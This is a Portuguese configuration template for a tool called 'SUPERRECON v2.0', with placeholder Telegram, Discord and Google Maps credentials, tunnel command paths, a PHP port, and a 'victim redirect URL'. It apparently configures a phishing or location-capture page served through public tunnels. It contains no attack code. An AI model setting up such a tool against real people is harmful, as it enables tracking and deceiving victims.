# SUPERRECON v2.0 — Configuração (Copie para config.env e preencha)
TELEGRAM_BOT_TOKEN="COLOQUE_SEU_TOKEN_AQUI"
TELEGRAM_CHAT_ID="COLOQUE_SEU_CHAT_ID_AQUI"
GOOGLE_MAPS_KEY="COLOQUE_SUA_CHAVE_GOOGLE_AQUI"
DISCORD_WEBHOOK_URL="COLE_O_WEBHOOK_AQUI_SE_FOR_USAR"

# Caminhos dos túneis (geralmente só o nome do comando)
CLOUDFLARED_PATH="cloudflared"
NGROK_PATH="ngrok"
LOCLX_PATH="loclx"

# Porta do servidor PHP
PHP_PORT=8080

# URL de redirecionamento da vítima
REDIRECT_URL="https://www.google.com"

# Modo debug (1 = ligado, 0 = desligado)
DEBUG=0
